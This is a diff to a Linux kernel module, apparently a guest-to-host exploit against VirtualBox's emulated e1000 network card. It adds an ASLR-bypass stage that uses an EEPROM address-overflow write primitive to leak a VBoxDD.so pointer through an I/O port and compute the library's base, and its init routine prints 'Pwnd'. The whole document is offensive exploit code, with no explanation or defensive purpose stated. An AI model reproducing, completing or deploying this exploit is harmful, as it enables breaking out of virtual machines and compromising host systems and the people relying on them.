@@ -11,6 +11,7 @@
 #include <linux/gfp.h>
 #include <linux/slab.h>
 #include <linux/delay.h>
+#include <asm/io.h>
 
 #include "e1k_utils.h"
 
@@ -20,6 +21,7 @@ MODULE_SUPPORTED_DEVICE("none");
 MODULE_LICENSE("TLS-SEC");
 
 #define NB_MAX_DESC 256
+#define LEAKED_VBOXDD_VAO 0x330D2E
 
 /* ========================== METHOD DECLARATION ========================== */
 static int __init e1k_init(void);
@@ -30,12 +32,12 @@ static void address_overflow(uint16_t new_addr);
 static void write_primitive(uint16_t address, uint16_t value);
 static void dump_reg(char* regname, uint16_t reg);
 static void dump_memory(void* buffer, int size);
+static uint64_t aslr_bypass(void);
 
 /* ==================== GLOBAL VARIABLES DECLARATION ====================== */
 uint8_t* bar0;
 struct e1000_desc* tx_ring;
 uint8_t* tx_buffer;
-
 
 /* ================================== CORE ================================ */
 /* ------------------------------ Constructor ----------------------------- */
@@ -47,7 +49,8 @@ static int __init e1k_init(void)
 		return -1;
 	}
 	e1k_configure();
-    write_primitive(0x1234,0xbabe);
+    aslr_bypass();
+	
 	pr_info("Pwnd");
 	return 0;
 }
@@ -59,7 +62,6 @@ static void __exit e1k_exit(void)
 	pr_info("Bye Bye");
 }
 module_exit(e1k_exit);
-
 
 /* ---------------------------- Useful functions -------------------------- */
 
@@ -117,7 +119,7 @@ static void e1k_configure(void)
 
 	tdba = (uint64_t)((uintptr_t) virt_to_phys(tx_ring));
 	set_register(TDBAL, (uint32_t) ((tdba & 0xFFFFFFFFULL)));
-	pr_info("tdbal = %lx\n", (uint32_t) (tdba & 0xFFFFFFFFULL)); // Don't remove or it will crash the VM when loading module ¯\_(ツ)_/¯
+	pr_info("¯\\_(ツ)_/¯");
 	set_register(TDBAH, (uint32_t) (tdba >> 32));
 
 	tdlen = DESC_SIZE * NB_MAX_DESC;
@@ -277,7 +279,7 @@ static void write_primitive(uint16_t address, uint16_t value)
 
 	// 4. Overflow EEPROM writing address
 	address_overflow(address);
-	mdelay(5000);
+	mdelay(3000);
 	
 	// 5. Write value thanks to legit operation into our overflowed address.
 	mask = 1 << 15;
@@ -322,4 +324,27 @@ static void dump_memory(void* buffer, int size)
 	for (i = 0; i < size; ++i) {
 		pr_info("%02x", *((uint8_t*)buffer + i));
 	}
+}
+
+static uint64_t aslr_bypass(void) {
+    pr_info("##### Stage 1 #####\n");
+
+    // e1000_disable_loopback_mode(mmio);
+
+    uint8_t leaked_bytes[8];
+    uint32_t i;
+    for (i = 0; i < 8; i++) {
+        write_primitive(0x266f, 0x0058 + 0x2A + 0x8 + i);
+        leaked_bytes[i] = inb(0x4107);
+
+        pr_info("Byte %d leaked: 0x%02X\n", i, leaked_bytes[i]);
+    }
+
+    uint64_t leaked_vboxdd_ptr = *((uint64_t *) leaked_bytes);
+    uint64_t vboxdd_base = leaked_vboxdd_ptr - LEAKED_VBOXDD_VAO;
+    pr_info("Leaked VBoxDD.so string : %s\n", (char *) leaked_vboxdd_ptr);
+    pr_info("Leaked VBoxDD.so pointer : 0x%016llx\n", leaked_vboxdd_ptr);
+    pr_info("Leaked VBoxDD.so base : 0x%016llx\n", vboxdd_base);
+
+    return vboxdd_base;
 }
